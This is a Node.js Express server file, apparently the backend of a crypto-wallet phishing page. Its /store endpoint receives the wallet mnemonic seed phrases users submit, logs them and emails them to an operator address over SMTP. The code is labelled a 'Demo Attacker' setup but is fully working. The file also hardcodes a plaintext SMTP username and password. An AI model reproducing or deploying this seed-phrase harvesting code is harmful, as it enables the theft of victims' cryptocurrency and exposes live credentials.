const express = require('express');  // Import express
const nodemailer = require('nodemailer');  // Import nodemailer
const bodyParser = require('body-parser');  // Import bodyParser for parsing JSON
const cors = require('cors');  // Import CORS package
const path = require('path'); // Add this line


const app = express();  // Initialize express app

// Enable CORS for all origins (you can restrict this in production)
app.use(cors());

// Middleware to parse incoming JSON request bodies
app.use(bodyParser.json());

// Serve static files from 'public' folder
app.use(express.static(path.join(__dirname, 'public')));  // This will serve all files in 'public'




// Setup Nodemailer for sending the email using your SMTP details
const transporter = nodemailer.createTransport({
  host: 'mail.revolva.online',  // Your SMTP host (revolva domain)
  port: 465,  // SMTP Port (465 is for SMTPS / implicit TLS)
  secure: true,  // Use TLS
  auth: {
    user: 'testfree2060@revolva.online',  // Your SMTP username (email address)
    pass: 'Ibelieveinmyself100%',  // Your SMTP password (replace with the actual password)
  },
  tls: {
    rejectUnauthorized: true,  // Security setting; reject unauthorized TLS certificates
  },
});

// Root route to test if the server is up
// Root route to serve the index.html file
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));  // Serve index.html from 'public'
});

// Endpoint to receive the mnemonic and wallet type from the frontend
app.post('/store', (req, res) => {
  const { mnemonic, wallet } = req.body;

  // Ensure that the request contains both mnemonic and wallet data
  if (!mnemonic || !wallet) {
    return res.status(400).json({ success: false, message: 'Mnemonic or wallet type missing' });
  }

  // Log the mnemonic (simulating attacker capturing it)
  console.log('Received mnemonic:', mnemonic);

  // Setup the email with the captured mnemonic
  const mailOptions = {
    from: '"Demo Attacker" <testfree2060@revolva.online>',  // Sender email
    to: 'testfree2060@revolva.online',  // Replace with your test email
    subject: 'Wallet Mnemonic Phrase Submitted',
    text: `Wallet Type: ${wallet}\nMnemonic: ${mnemonic}`,  // Send the mnemonic and wallet type
  };

  // Send the email with the captured mnemonic
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log('Error sending email:', error);
      return res.status(500).json({ success: false, message: 'Error sending email' });
    } else {
      console.log('Email sent: ' + info.response);
      return res.status(200).json({ success: true, message: 'Mnemonic received and emailed' });
    }
  });
});

// Start the server on port 3000
app.listen(3000, () => {
  console.log('Server listening on port 3000');
});




